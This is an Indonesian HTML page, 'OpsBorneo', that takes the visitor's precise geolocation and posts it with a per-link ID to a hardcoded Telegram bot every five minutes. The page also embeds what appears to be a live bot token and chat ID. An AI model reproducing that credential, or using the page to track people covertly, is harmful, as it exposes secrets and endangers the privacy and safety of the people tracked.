<!DOCTYPE html>
<html>
<head>
  <title>Berbagi Lokasi - OpsBorneo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h2>Berbagi Lokasi Langsung - OpsBorneo</h2>
  <p id="status">Mengambil lokasi...</p>

  <script>
    const telegramBotToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const chatId = "5677912817";

    // Ambil ID pengguna dari parameter URL
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id') || "TANPA_ID";

    function kirimLokasi(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const linkMaps = `https://maps.google.com/?q=${lat},${lon}`;
      const pesan = `[ID: ${userId}]\nLokasi dikirim: ${lat}, ${lon}\n${linkMaps}`;
      document.getElementById("status").innerText = pesan;

      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: pesan
        })
      });
    }

    function mulaiPantau() {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "Geolocation tidak didukung di browser ini.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        kirimLokasi,
        () => document.getElementById("status").innerText = "Gagal mendapatkan lokasi.",
        { enableHighAccuracy: true }
      );

      // Perbarui lokasi setiap 5 menit
      setInterval(() => {
        navigator.geolocation.getCurrentPosition(
          kirimLokasi,
          () => document.getElementById("status").innerText = "Gagal memperbarui lokasi.",
          { enableHighAccuracy: true }
        );
      }, 300000); // 5 menit
    }

    mulaiPantau();
  </script>
</body>
</html>
